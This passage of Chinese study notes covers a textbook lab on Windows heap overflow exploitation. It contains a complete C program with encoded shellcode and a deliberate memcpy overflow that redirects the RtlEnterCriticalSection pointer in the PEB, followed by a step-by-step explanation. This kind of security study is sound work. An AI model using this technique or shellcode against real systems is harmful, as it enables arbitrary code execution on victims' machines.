（6）P.E.B中线程同步函数的入口地址：天才的黑客们发现在每个进程的P.E.B中都存放着―对同步函数指针，指向RtlEnterCriticalSection()和RtILeaveCriticalSection()，并且在进程退出时会被ExitProcess()调用。如果能够通过DWORD SHOOT修改这对指针中的其中一个，那么在程序退出时ExitProcess()将会被骗去调用我们的shellcode。由于P.E.B的位置始终不会变化，这对指针在P.E.B中的偏移也始终不变，这使得利用堆溢出开发适用于不同操作系统版本和补丁版本的exploit成为可能。这种方法一经提出就立刻成为了Windows平台下堆溢出利用的最经典方法之一，因为静止的靶子比活动的靶子好打得多，我们只需要把枪架好，闭着眼睛扣扳机就是了。

### 狙击P.E.B中RtlEnterCritical-Section()的函数指针

我们可以观察一下实验代码给的意图

```c
#include <windows.h>

char shellcode[]=
"\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90"
//repaire the pointer which shooted by heap over run
"\xB8\x20\xF0\xFD\x7F"  //MOV EAX,7FFDF020
"\xBB\x60\x20\xF8\x77"  //MOV EBX,77F82060 此处地址需调试得出
"\x89\x18"                //MOV DWORD PTR DS:[EAX],EBX
"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
"\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90"
"\x16\x01\x1A\x00\x00\x10\x00\x00"       
"\x30\x60\x40\x00\x20\xf0\xfd\x7f";//前四字节即为前向指针，指向Shellcode地址，此地址需调试得出；后四字节为后向指针，在此操作系统中固定不变

main()
{
    HLOCAL h1 = 0, h2 = 0;
    HANDLE hp;
    hp = HeapCreate(0,0x1000,0x10000);
    h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,200);
    //__asm int 3 //中断进程
    memcpy(h1,shellcode,0x200); //overflow,0x200=512
    h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8);
    return 0;
}
```

1、h1向堆中申请了200字节的空间

2、memcpy的上限错误的写成了0x200，这实际上时512字节，所以会溢出

3、h1后面的尾块会被超过200字节的数据覆盖，包括尾块块首

4、用伪造的指针覆盖尾块块首中的空表指针，当h2分配时，将导致DWORD SHOOT

5、DWORD SHOOT的目标是Ox7FFDFO20处的RtlEnterCriticalSection()函数指针，可以简单地将其直接修改为shellcode的位置。

6、DWORD SHOOT完毕后，堆溢出导致异常，最终将调用ExitProcess()结束进程。

7、ExitProcess()在结束进程时需要调用临界区函数来同步线程，但却从P.E.B中拿出了指向shellcode的指针，因此shellcode被执行。

shellcode执行地址

![image-20220907190409970](%E5%A0%86%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0.assets/image-20220907190409970.png)

![image-20220907190648597](%E5%A0%86%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0.assets/image-20220907190648597.png)



学习资料：

《0day安全：软件漏洞分析技术》

[堆和栈的区别](https://blog.csdn.net/zDavid_2018/article/details/89255630)

[HeapAlloc 函数](https://docs.microsoft.com/en-us/windows/win32/api/heapapi/nf-heapapi-heapalloc)t
